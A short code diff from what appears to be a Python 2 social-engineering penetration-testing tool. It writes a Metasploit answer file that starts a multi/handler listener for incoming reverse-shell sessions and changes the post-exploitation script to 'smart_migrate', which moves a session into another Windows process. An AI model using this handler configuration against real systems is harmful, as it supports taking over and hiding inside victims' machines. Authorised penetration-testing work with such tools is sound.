@@ -153,7 +153,7 @@ if choice == "YES":
         fileopen = file("src/program_junk/port.options", "r")
         port = fileopen.read()
         filewrite = file("src/program_junk/metasploit.answers", "w")
-        filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript migrate -f\nexploit -j" % (payload,ipaddr,port))
+        filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
         filewrite.close()
         print "[*] Launching Metasploit...."
         try:
